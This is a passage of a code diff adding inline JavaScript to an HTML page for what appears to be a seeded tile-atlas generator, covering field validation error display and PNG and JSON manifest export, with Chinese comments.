+    } else {
+      els.canvas.style.display = 'none';
+      els.placeholder.style.display = 'block';
+      els.placeholderText.textContent = message;
+      els.stateText.innerHTML = '<span class="badge-err">暂无可显示的图集</span>';
+      els.sizeText.textContent = '—';
+      els.usageText.textContent = '—';
+      [els.exportPng, els.exportJson, els.exportBoth].forEach(function (b) { b.disabled = true; });
+    }
+    if (field) setFieldError(field, message);
+  }
+
+  function update(force) {
+    ['rows', 'columns', 'cellSize', 'seed'].forEach(function (n) { setFieldError(n, ''); });
+    if (!force) setFieldError('palette', '');
+
+    var params = readParams();
+    var result = WeaveCore.evaluate(params);
+
+    if (result.ok) {
+      setFieldError('palette', '');
+      showValid(result);
+      return;
+    }
+
+    // 把错误归到对应字段；结构性错误（可行性/调色板）显示在调色板区域与状态条
+    var msg = result.error;
+    var field = 'palette';
+    if (msg.indexOf('行数') === 0) field = 'rows';
+    else if (msg.indexOf('列数') === 0) field = 'columns';
+    else if (msg.indexOf('单元格像素') === 0) field = 'cellSize';
+    else if (msg.indexOf('种子') === 0) field = 'seed';
+    setFieldError(field, msg);
+    showInvalid(msg, field);
+  }
+
+  /* ---------------- 导出 ---------------- */
+
+  function exportPNG(result) {
+    var callback = function (blob) {
+      if (!blob) {
+        // 极端环境不支持 toBlob 时的兜底：dataURL
+        var a = document.createElement('a');
+        a.href = els.canvas.toDataURL('image/png');
+        a.download = baseName(result) + '.png';
+        a.click();
+        return;
+      }
+      download(blob, baseName(result) + '.png');
+    };
+    els.canvas.toBlob(callback, 'image/png');
+  }
+
+  function exportJSON(result) {
+    var manifest = WeaveCore.buildManifest(result);
+    var blob = new Blob([JSON.stringify(manifest, null, 2) + '\n'], { type: 'application/json' });
+    download(blob, baseName(result) + '.json');
+  }
+
+  els.exportPng.addEventListener('click', function () { if (lastValid) exportPNG(lastValid); });
+  els.exportJson.addEventListener('click', function () { if (lastValid) exportJSON(lastValid); });
+  els.exportBoth.addEventListener('click', function () {
+    if (!lastValid) return;
+    exportJSON(lastValid);
+    setTimeout(function () { exportPNG(lastValid); }, 150);
+  });
+
+  ['rows', 'columns', 'cellSize', 'seed'].forEach(function (name) {
+    els[name].addEventListener('input', scheduleUpdate);
+  });
+
+  /* ---------------- 初始化 ---------------- */
+  renderPaletteRows();
+  update(true);
+})();
+</script>
 </body>
 </html>
